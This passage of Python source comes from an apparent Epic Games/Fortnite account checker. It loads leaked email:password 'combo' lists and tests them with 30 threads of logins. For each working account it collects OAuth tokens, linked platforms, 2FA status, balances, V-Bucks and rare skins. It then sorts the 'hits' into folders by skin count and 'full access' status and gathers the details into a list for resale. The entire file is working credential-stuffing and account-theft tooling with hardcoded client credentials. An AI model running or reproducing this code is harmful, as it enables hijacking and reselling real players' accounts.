                "token_type": "eg1"
            }
            headers = {
                "Host": "account-public-service-prod.ak.epicgames.com",
                "Accept": "*/*",
                "X-Epic-Correlation-ID": "UE4-0cb999094c593037703e67a2364dad7a-63523E0D4DA6FA14E96DC9A5AC137A03-3E1FA7274351413FF9E430829D1920FC",
                "User-Agent": "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=",  # Replace this with the actual encoded credentials if necessary
                "Accept-Encoding": "gzip, deflate"
            }
            response = scraper.post(url, data=payload, headers=headers)
            parsed_json = response.json()
            AT1 = parsed_json.get("access_token")
            ACCID = parsed_json.get("account_id")
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Authorization": f"bearer {AT1}"
            }       
            url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
            response = scraper.get(url, headers=headers, cookies=response.cookies)
            if '"code":"' in response.text:
                start = response.text.find("\"code\":\"") + len("\"code\":\"")
                end = response.text.find("\"", start)
                CODE22 = response.text[start:end]
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                }
                payload = {
                    "grant_type": "exchange_code",
                    "exchange_code": CODE22
                }
                url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
                response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies)
                if "refresh_token" in response.json():
                    RT = response.json().get("refresh_token")
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                    }
                    payload = {
                        "grant_type": "refresh_token",
                        "refresh_token": RT
                    }

                    response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies)
                    if "access_token" in response.json():
                        AT = response.json().get("access_token")
                        headers = {
                            "User-Agent": "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit",
                            "Authorization": f"bearer {AT1}"
                        }
                        linked = []
                        url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{ACCID}/externalAuths'
                        response = scraper.get(url, headers=headers)
                        if response.status_code == 200:
                            pass
                        platforms = {
                            '"type":"xbl"': 'Xbox',
                            '"type":"psn"': 'Playstation',
                            '"type":"steam"': 'Steam',
                            '"type":"twitch"': 'Twitch',
                            '"type":"lego"': 'Lego',
                            '"type":"nintendo"': 'Nintendo',
                            '"type":"github"': 'Github'
                        }
                        for platform_type, platform_name in platforms.items():
                            if platform_type in response.text:
                                linked.append(platform_name)
                        url = f'https://egs-platform-service.store.epicgames.com/api/v1/private/egs/account/wallet?locale=en&store=EGS'

                        response = scraper.get(url, headers=headers)
                        balance = response.json().get("epicRewards", {}).get("balance", None)
                        url = f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{ACCID}"
                        
                        response = scraper.get(url, headers=headers)
                        if response.status_code == 200:
                            data = response.json()
                            # with open('data.txt', 'a', encoding='utf8') as f:
                            #     f.write(f'{data}\n')
                            display_name = data.get("displayName", "Not Available")
                            country = data.get("country", "Not Available")
                            tfa_enabled = data.get("tfaEnabled", "Not Available")
                            epicEmail = data.get("email", "Not Available")
                            email_verified_status = data.get("emailVerified", "Unknown")
                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/public/QueryPublicProfile?profileId=campaign"
                            headers = {
                                "Authorization": f"Bearer {AT}",
                                "Content-Type": "application/json"
                            }
                            while True:
                                try:
                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies)
                                    data = response.json()
                                    if data:
                                        # with open('stwdata.txt',  'a', encoding='utf8', errors='ignore') as f:
                                        #     f.write(f'{line}\n\n====================================================\n{data}\n\n')
                                        break
                                except:
                                    continue

                            try:
                                if "tutorial" in str(object=data):
                                    has_stw = "YES"
                                else:
                                    has_stw = "NO"
                            except:
                                has_stw = 'ERROR'

                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=athena&rvn=-1"
                            headers = {
                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                "Authorization": f"Bearer {AT}",
                                "Content-Type": "application/json"
                                }
                            response = scraper.post(url, headers=headers, json={}, cookies=response.cookies)
                            response_str = response.text
                            if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                print(f'{red}[FN-BAN] - {white}{line}')
                                checked += 1
                                return

                            if has_stw == 'YES':
                                print(f'{lgreen}[STW] - {white}{line}{rescolor}')

                            level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                            total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                            level_match = level_pattern.search(response_str)
                            level = level_match.group(1) if level_match else 'N/A'
                            total_wins_match = total_wins_pattern.search(response_str)
                            total_wins = total_wins_match.group(1) if total_wins_match else 'N/A'
                            data = response.json()
                            # with open('accdata.txt', 'a', encoding='utf8', errors='ignore') as f:
                            #     f.write(f'{line}\n=============================================================\n{data}\n\n')
                            past_seasons = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('past_seasons', [])
                            try:
                                last_login = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('last_match_end_datetime', 'N/A')
                            except:
                                last_login = 'N/A'
                            first_active_season = None
                            for season in past_seasons:
                                try:
                                    if season['seasonXp'] > 0:
                                        if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                            first_active_season = season
                                except:
                                    continue
                            if first_active_season:
                                first_active_season = first_active_season['seasonNumber']
                            else:
                                first_active_season = 'N/A'
                            skins = []
                            exclusive = False
                            exclusiveSkin = []
                            localSkins = []
                            try:
                                with open('skins_database.txt', 'r') as f:
                                    localSkins = f.read().strip().splitlines()
                            except:
                                localSkins = []
                            def search_skins(obj):
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        if key == "templateId" and value.startswith("AthenaCharacter:"):
                                            found = False
                                            skin_id = value.split("AthenaCharacter:")[1]
                                            for linee in localSkins:
                                                if linee.split(sep=':')[0].lower() == skin_id.lower():
                                                    found = True
                                                    skinName = linee.split(':')[1]
                                                    skins.append(skinName)
                                            if not found:
                                                while True:
                                                    try:
                                                        url = f'https://fortnite-api.com/v2/cosmetics/br/{skin_id}'
                                                        r = requests.get(url).json()
                                                        if r['status'] == 200:
                                                            skinName = r['data']['name']
                                                            with open('skins_database.txt', 'a') as f:
                                                                f.write(f'{skin_id}:{skinName}' + '\n')
                                                            skins.append(skinName)
                                                            break
                                                    except Exception as e:
                                                        continue
                                                # wtf = ['Cursed Jack Sparrow', 'Robert Trujillo', 'Kirk Hammett', 'James Hetfield', 'The Weeknd']
                                                # if skinName not in wtf:
                                        else:
                                            search_skins(value)
                                elif isinstance(obj, list):
                                    for item in obj:
                                        search_skins(item)
                            search_skins(data)
                            unique_skins = set(skins)
                            total_skins = len(unique_skins)
                            processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                            exclusiveSkins = [
                                'glow', 'eon', 'dark skully', 'rogue spider knight'
                                'black knight', 'skull trooper', 'ghoul trooper',
                                'omega','blitz', 'havoc', 'john wick', 'blue striker',
                                'prodigy', 'galaxy', 'blue team leader', 'royal knight',
                                'stealth reflex', 'sub commander','chun-li', 'huntmaster saber','the reaper', 'blue squire', 
                                'royale knight', 'sparkle specialist', 'brutus', 
                                'midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
                                'strong guard', 'rose team leader', 'warpaint', 'travis', 
                                'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik', 'reflex'
                            ]
                            for skin in processed_skins:
                                if skin.lower() in exclusiveSkins:
                                    exclusive = True
                                    exclusiveSkin.append(skin)
                            dances = []
                            gliders = []
                            pickaxes = []
                            backpacks = []
                            def search_items(obj):
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        if key == "templateId":
                                            if value.startswith("AthenaDance:eid_"):
                                                dances.append(value)
                                            elif value.startswith("AthenaGlider:"):
                                                gliders.append(value)
                                            elif value.startswith("AthenaPickaxe:"):
                                                pickaxes.append(value)
                                            elif value.startswith("AthenaBackpack:"):
                                                backpacks.append(value)
                                        else:
                                            search_items(value)
                                elif isinstance(obj, list):
                                    for item in obj:
                                        search_items(item)
                            search_items(data)
                            total_dances = len(dances)
                            total_gliders = len(gliders)
                            total_pickaxes = len(pickaxes)
                            total_backpacks_bid = sum(1 for item in backpacks if "bid_" in item)
                            total_backpacks_backpack = sum(1 for item in backpacks if "backpack_" in item)
                            total_backpacks = total_backpacks_bid + total_backpacks_backpack
                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=common_core&rvn=-1"
                            headers = {
                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                "Authorization": f"bearer {AT}",
                                "Content-Type": "application/json"
                            }
                            content = "{}"
                            while True:
                                try:
                                    response = scraper.post(url, headers=headers, data=content, cookies=response.cookies)
                                    if response.status_code == 200:
                                        data = response.json()
                                        break
                                except Exception as e:
                                    continue
                            try:
                                def extract_quantity():
                                    quantity = 0
                                    items = data['profileChanges'][0]['profile']['items']
                                    for item_id, item in items.items():
                                        if 'Currency:Mtx' in item['templateId']:
                                            quantity += item.get('quantity', 0)
                                    return quantity
                                Total_VBucks = extract_quantity()
                            except:
                                Total_VBucks = 'None'
                            isOG = 'NO'
                            try:
                                if int(first_active_season) <= 4:
                                    isOG = 'YES'
                            except:
                                isOG = 'NO'

                            prints(
                            f'{lgreen}[HIT]' +
                            ('[FA]' if epicEmail.lower() == user.lower() else '[NFA]') +
                            (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                            (f'[V:{Total_VBucks}]' if int(Total_VBucks) > 0 else '') +
                            (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                            (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
                            f'[OG:{isOG}]' + 
                            f' - {white}{line}{rescolor}' + 
                            (f' - {lgreen}[Exclusive Skins: ({len(exclusiveSkin)}) {[i for i in exclusiveSkin]}]' if len(exclusiveSkin) > 0 else f' - {lgreen}[First Season: {str(first_active_season)}]'))
                            
                            fullAccess = 'NFA'
                            outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr", "hotmail.com.br", "outlook.com.br", "hotmail.it", "outlook.it", "outlook.co.uk", "hotmail.co.uk"]
                            if epicEmail.lower() == user.lower() and any(domain in user.lower() for domain in outlook_domains):
                                fullAccess = 'FA'
                            skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins, "exclusive": exclusive})
                            if not os.path.exists(folder + '/Fortnite'):
                                os.makedirs(folder + '/Fortnite')
                            open(f'{folder}/Fortnite/all.txt', 'a',
                            encoding='u8').write(f'{line}\n========================================================\n{skins_data}\n\n')
                            message = f"{user}:{password} | Name: {display_name} | FullAccess: {fullAccess} | Email Verified: {email_verified_status} | Linked Accounts: {linked}"
                            if tfa_enabled != None: message+=f" | 2FA: {tfa_enabled}"
                            if last_login != None: message+=f" | Last Match: {last_login}"
                            if fullAccess == 'NFA': message+=f" | Epic Email: {epicEmail}"
                            if country != None: message+=f" | Country: {country}"
                            if balance != None: message+=f" | Balance: {balance}"
                            if has_stw != 'NO': message+=f" | Save The World"
                            if level != None: message+=f" | Level: {level}"
                            if Total_VBucks != None: message+=f"  | Vbucks: {Total_VBucks}"
                            if total_wins != None: message+=f" | Total Wins: {total_wins}"
                            if first_active_season != None: message+=f" | First Season: {first_active_season}"                                        
                            if total_dances != None: message+=f" | Emotes: {total_dances}"
                            if total_gliders != None: message+=f" | Gliders: {total_gliders}"
                            if total_pickaxes != None: message+=f" | Pickaxes: {total_pickaxes}"
                            if total_backpacks != None: message+=f" | BackBlings: {total_backpacks}"
                            if exclusive: message+=f"\nExclusives: [{len(exclusiveSkin)}] {exclusiveSkin}"
                            if processed_skins != None: message+=f"\nSkins: [{total_skins}] {processed_skins}"
                            message = message+"\n============================"
                            if not exclusive:
                                exclusiveskins = 0
                            else:
                                exclusiveskins = len(exclusiveSkin)
                            sellerstuff.append({"fullAccess": fullAccess,"2fa": tfa_enabled, "total_skins": total_skins,"skins_list": processed_skins,"exclusive": exclusive,"exclusives_list": exclusiveSkin,"mail_verified": email_verified_status,"last_login": last_login,"linked_accs": linked,"balance":balance})

                            if exclusive:
                                if not os.path.exists(folder + '/Fortnite/Exclusive'):
                                    os.makedirs(folder + '/Fortnite/Exclusive')
                                open(f'{folder}/Fortnite/Exclusive/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                            if int(total_skins) == 0:
                                if not os.path.exists(folder + '/Fortnite/NoSkins'):
                                    os.makedirs(folder + '/Fortnite/NoSkins')
                                open(f'{folder}/Fortnite/NoSkins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/NoSkins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 1 and int(total_skins) < 10:
                                if not os.path.exists(folder + '/Fortnite/1-9Skins'):
                                    os.makedirs(folder + '/Fortnite/1-9Skins')
                                open(f'{folder}/Fortnite/1-9Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/1-9Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 10 and int(total_skins) < 50:
                                if not os.path.exists(folder + '/Fortnite/10-49Skins'):
                                    os.makedirs(folder + '/Fortnite/10-49Skins')
                                open(f'{folder}/Fortnite/10-49Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/10-49Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 50 and int(total_skins) < 100:
                                if not os.path.exists(folder + '/Fortnite/50-99Skins'):
                                    os.makedirs(folder + '/Fortnite/50-99Skins')
                                open(f'{folder}/Fortnite/50-99Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/50-99Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 100 and int(total_skins) < 200:
                                if not os.path.exists(folder + '/Fortnite/100-199Skins'):
                                    os.makedirs(folder + '/Fortnite/100-199Skins')
                                open(f'{folder}/Fortnite/100-199Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/100-199Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 200 and int(total_skins) < 300:
                                if not os.path.exists(folder + '/Fortnite/200-299Skins'):
                                    os.makedirs(folder + '/Fortnite/200-299Skins')
                                open(f'{folder}/Fortnite/200-299Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/200-299Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            elif int(total_skins) >= 300:
                                if not os.path.exists(folder + '/Fortnite/300+Skins'):
                                    os.makedirs(folder + '/Fortnite/300+Skins')
                                open(f'{folder}/Fortnite/300+Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                encoding='u8').write(f'{message}\n')
                                open(f'{folder}/Fortnite/300+Skins/All.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            checked +=1
                            return

def emails_extractor(combo_file):
    emails_regex = r'[a-zA-Z0-9\.+_?!$%#^&*()=?\\|,-]+@+(live.co.uk|live.fr|live.com|outlook.co.uk|hotmail.co.uk|hotmail.fr|outlook.fr|outlook.com|hotmail.com|outlook.com.br|hotmail.com.br|outlook.it|hotmail.it|gmail.com|yahoo.com|online-de.com|hotmail.es|msn.com)+:+[a-zA-Z0-9\.-_=+!@#$%^&*()<>?\\,]+'
    acc_list = []
    with open(f'combo/{combo_file}', 'r', encoding='utf8', errors='ignore') as f:
        content = f.readlines()
        for em in content:
            emai = re.match(emails_regex, em)
            if emai:
                acc_list.append(emai.group())
    return acc_list

def banner():
    
    print(f'''
 {lgreen}█████╗ ██╗  ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
{lgreen}██╔══██╗██║ ██╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
{green}███████║█████╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
{green}██╔══██║██╔═██╗     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
{lgreen}██║  ██║██║  ██╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
{lgreen}╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
''')

threads  = []
threads2 = []
start =  time.time()


def main():
    global total_lines
    combo_file = os.listdir('combo')
    if combo_file:
        combo = combo_file[-1]
        accs = emails_extractor(combo)
        clean_accs = list(dict().fromkeys(accs))
        total_lines = len(clean_accs)
        print(f'Loaded Combo: {total_lines}\n{rescolor}')
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(check, acc): acc for acc in clean_accs}
            for future in futures:
                try:
                    result = future.result()
                except Exception as e:
                    print(f'{red}Error: {e}{rescolor}')

        while True:
            if len(toomany) > 0:
                with ThreadPoolExecutor(max_workers=30) as executor:
                    futures = {executor.submit(check, acc): acc for acc in toomany}
                    for future in futures:
                        try:
                            result = future.result()
                            toomany.remove(futures[future])
                        except Exception as e:
                            print(f'{red}Error: {e}{rescolor}')
            else:
                break
    else:
        print(f'\n{red}No Combo File Found{white}\n')
        input('')

    endt = time.time() - start
    print(f'\nEstimated Time in Minutes: {round(endt/60)}\n')


if __name__ == '__main__':
    os.system('cls')
    init(convert=True)
    white = Fore.WHITE
    red = Fore.RED
    green = Fore.GREEN
    lgreen = Fore.LIGHTGREEN_EX
    yellow = Fore.YELLOW
    blue = Fore.CYAN
    lb = Fore.LIGHTBLUE_EX
    rescolor = Fore.RESET
    ms_hits = 0
    spam = 0
    failed = 0
    checked = 0
    check_combo_folder()
    banner()
    set_cpu_limit()
    main()
    input(f'\n{blue}Checker Finished.... ')